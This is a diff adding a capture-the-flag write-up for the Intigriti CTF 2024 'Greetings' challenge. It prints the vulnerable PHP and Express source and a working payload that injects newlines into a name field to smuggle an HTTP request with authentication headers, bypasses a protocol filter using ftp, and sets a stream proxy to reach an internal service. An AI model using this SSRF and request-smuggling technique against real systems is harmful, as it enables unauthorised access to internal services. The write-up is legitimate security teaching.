@@ -803,3 +803,167 @@ We can see the response that "Logging into my staff account." Let's check out th
 We got the flag. <br>
 
 **Flag:** `INTIGRITI{5up3r_u53r_535510n}`
+
+## Greetings
+**Solvers:** 23 <br>
+**Author:** abd0ghazy
+
+### Description
+What could go wrong with a simple greetings service based in micro services? <br>
+![Greetings](/assets/img/Intigriti-ctf_2024/greetings.png)
+
+### Solution
+Enter a random name and we can see nothing special. <br>
+![Greetings Name](/assets/img/Intigriti-ctf_2024/greetings_name.png)
+
+Let's check the source code from the challenge provider. <br>
+![Greetings Source Code](/assets/img/Intigriti-ctf_2024/greetings_source_code.png)
+![Greetings Source Code VSCode](/assets/img/Intigriti-ctf_2024/greetings_source_code_vscode.png)
+
+Look around the source code and we can see two files that we need to check. <br>
+- `index.js`
+- `index.php`
+
+Let's check `index.js` first.
+```js
+const express = require("express");
+
+const app = express();
+
+app.get("*", (req, res) => {
+    res.send(`Hello, ${req.path.replace(/^\/+|\/+$/g, "")}`);
+});
+
+app.listen(3000, () => {
+    console.log(`App listening on port 3000`);
+});
+```
+- It's a simple Express.js application that listens on port 3000.
+- It will greet the user based on the path they entered.
+- The path is sanitized by removing leading and trailing slashes.
+
+Let's check `index.php`.
+```php
+<?php
+if(isset($_POST['hello']))
+{
+    session_start();
+    $_SESSION = $_POST;
+    if(!empty($_SESSION['name']))
+    {
+        $name = $_SESSION['name'];
+        $protocol = (isset($_SESSION['protocol']) && !preg_match('/http|file/i', $_SESSION['protocol'])) ? $_SESSION['protocol'] : null;
+        $options = (isset($_SESSION['options']) && !preg_match('/http|file|\\\/i', $_SESSION['options'])) ? $_SESSION['options'] : null;
+        
+        try {
+            if(isset($options) && isset($protocol))
+            {
+                $context = stream_context_create(json_decode($options, true));
+                $resp = @fopen("$protocol://127.0.0.1:3000/$name", 'r', false, $context);
+            }
+            else
+            {
+                $resp = @fopen("http://127.0.0.1:3000/$name", 'r', false);
+            }
+
+            if($resp)
+            {
+                $content = stream_get_contents($resp);
+                echo "<div class='greeting-output'>" . htmlspecialchars($content) . "</div>";
+                fclose($resp);
+            }
+            else
+            {
+                throw new Exception("Unable to connect to the service.");
+            }
+        } catch (Exception $e) {
+            error_log("Error: " . $e->getMessage());
+            
+            echo "<div class='greeting-output error'>Something went wrong!</div>";
+        }
+    }
+}
+?>
+```
+
+1. About input handling and filtering:
+```php
+$protocol = (isset($_SESSION['protocol']) && !preg_match('/http|file/i', $_SESSION['protocol'])) ? $_SESSION['protocol'] : null;
+```
+- Filters out `http/file` protocols using regex.
+- Filters out `\` using regex.
+- Both default to null if not set/valid.
+
+So we can use `ftp` protocol with proxy option to redirect requests.
+
+2. About `stream_context_create`:
+```php
+$context = stream_context_create(json_decode($options, true));
+```
+- Parses the JSON options to create a context.
+- Uses the parsed options to configure the stream context.
+
+We can inject FTP proxy settings to redirect requests to internal web service.
+
+3. For the HTTP request:
+```php
+$resp = @fopen("$protocol://127.0.0.1:3000/$name", 'r', false, $context);
+```
+- The `name` parameter is used in the URL without proper sanitization.
+
+We can inject HTTP headers through newlines and craft a custom HTTP requests.
+
+Let's exploit it. <br>
+Our payload:
+```
+name=aaa HTTP/1.1
+Host: a
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+password: admin
+
+username=admin&hello=a&protocol=ftp://a/flag?&options={"ftp":{"proxy":"tcp://web:5000"}}
+```
+
+Let's explain details:
+1. For the request smuggling part:
+```
+aaa HTTP/1.1
+Host: a
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+password: admin
+```
+- Creates new HTTP request inside name parameter
+- Injects authentication headers
+
+2. For the proxy settings:
+```
+protocol=ftp://a/flag?
+```
+- Uses FTP to bypass protocol filter
+- Points to flag endpoint
+
+3. About stream options:
+```json
+{
+    "ftp":{
+        "proxy":"tcp://web:5000"
+    }
+}
+```
+- Injects proxy settings to redirect requests to internal web service.
+
+Here is the workflow exploit:
+1. Send crafted POST request with payload
+2. Application processes FTP protocol and proxy settings
+3. Request gets redirected to internal service
+4. Smuggled HTTP headers bypass authentication
+5. Access flag endpoint through proxied connection
+
+Let's see the result. <br>
+![Greetings Exploit](/assets/img/Intigriti-ctf_2024/greetings_exploit.png)
+
+We got the flag. <br>
+
+**Flag:** `INTIGRITI{5mu66l1n6_r3qu3575_w17h_f7p}`
